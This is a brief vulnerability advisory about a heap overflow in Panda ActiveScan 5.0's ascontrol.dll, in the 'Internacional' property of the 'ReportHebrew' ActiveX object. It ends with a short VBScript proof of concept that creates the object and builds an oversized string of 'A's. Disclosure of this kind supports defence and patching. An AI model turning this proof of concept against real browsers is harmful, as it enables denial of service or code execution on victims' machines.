It has been reported that Panda ActiveScan may be prone to a remote heap overflow vulnerability that may allow an attacker to cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code.

The issue is reported to exist in the 'ascontrol.dll' file, specifically the 'Internacional' property of the 'ReportHebrew' object is identified as vulnerable.

Panda ActiveScan 5.0 has been reported to be prone to this issue.

dim mymy
Set mymy = CreateObject("ASControl.ReportHebrew.1" )

a="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
